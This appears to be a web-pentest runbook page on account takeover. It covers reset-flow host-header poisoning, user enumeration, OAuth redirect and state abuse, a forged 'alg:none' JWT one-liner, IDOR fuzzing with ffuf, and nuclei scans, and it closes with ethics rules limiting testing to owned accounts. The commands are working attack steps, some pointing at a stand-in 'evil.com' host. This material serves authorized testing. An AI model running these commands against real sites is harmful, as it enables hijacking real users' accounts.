---
title: "Account Takeover"
description: "Chained flaws that hand over an account: reset and email-change weaknesses, OAuth linking, session fixation, IDOR on user objects, and leaked credentials."
phase: Web
order: 12
tags:
  - account-takeover
  - authentication
  - oauth
  - idor
tools:
  - curl
  - ffuf
  - nuclei
updated: 2026-10-01
---

A runbook for authorized account-takeover testing on **in-scope** targets. Goal: chain small flaws (reset, relink, session) into control of an account you own, and stop at read-only proof.

## 1. Map authentication endpoints

Enumerate login, reset, change-email, OAuth, and session endpoints.

```bash
gau target.com | grep -iE 'reset|forgot|password|email|verify|oauth|token|session' \
  | sort -u > auth_paths.txt
cat auth_paths.txt
```

## 2. Probe password reset flaws

```bash
# Host-header injection: does the reset link follow the poisoned host?
curl -s -X POST https://target/forgot \
  -H "Host: evil.com" -d "email=me@example.com" -i | grep -i location

# User enumeration via differing responses
for e in me@example.com nobody@example.com; do
  curl -s -o /dev/null -w "$e %{http_code} %{size_download}\n" \
    -X POST https://target/forgot -d "email=$e"
done
```

Then test token predictability (sequential/time-based), whether tokens are bound to the user, expiry, and invalidation of old tokens.

## 3. Email-change bypass

- Can you set another user's email, or confirm a change without re-auth?
- Is the confirmation token reusable across accounts?
- Does an unverified email unlock verified-only features?

## 4. OAuth account linking

```bash
# Missing state => CSRF to link an attacker identity
curl -s "https://target/oauth/authorize?client_id=x&redirect_uri=https://evil.com&state=" -i
```

Check for missing `state`, open `redirect_uri`, pre-registration with a victim's email, and linking without verification.

## 5. Sessions and tokens

- Session fixation: set a known session ID before login, reuse it after.
- JWT issues: `alg:none`, weak HMAC secret, missing signature, `kid` injection.

```bash
# Test alg:none acceptance
token=$(python3 -c "import base64,json;h=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=');p=base64.urlsafe_b64encode(json.dumps({'sub':'me'}).encode()).rstrip(b'=');print((h+b'.'+p+b'.').decode())")
curl -s https://target/api/me -H "Authorization: Bearer $token"
```

## 6. IDOR on user objects and leaked creds

```bash
# Reach other user objects by ID (use an account you own as the target)
seq 1 50 | ffuf -u "https://target/api/v1/users/FUZZ" \
  -H "Cookie: session=USERA" -mc 200 -fs 0 -w - -s

# Automated checks for known session/JWT patterns
nuclei -u https://target.com -t http/misconfiguration/ -t http/tokens/ -silent
```

Also check password reuse and credentials in JS bundles, source maps, and public repos.

## 7. Prove impact

Document the full chain and stop at read-only proof where possible. Do not use a taken-over account for destructive or financial actions.

## Full pipeline

```bash
# 1. Enumerate auth surface
gau target.com | grep -iE 'reset|forgot|password|email|verify|oauth|token|session' | sort -u > auth_paths.txt

# 2. Host-header reset test + user enumeration
curl -s -X POST https://target/forgot -H "Host: evil.com" -d "email=me@example.com" -i | grep -i location
for e in me@example.com nobody@example.com; do
  curl -s -o /dev/null -w "$e %{http_code} %{size_download}\n" -X POST https://target/forgot -d "email=$e"
done

# 3. IDOR scan on user objects with your own session
seq 1 50 | ffuf -u "https://target/api/v1/users/FUZZ" -H "Cookie: session=USERA" -mc 200 -fs 0 -w - -s

# 4. Pattern checks for weak sessions
nuclei -u https://target.com -t http/misconfiguration/ -t http/tokens/ -silent
```

## Ethics & legality

- Only test accounts you own or are explicitly authorized to access.
- Never take over a real user's account; prove the chain against your own second account.
- Redact personal data, keep impact non-destructive, and report the exact request sequence.
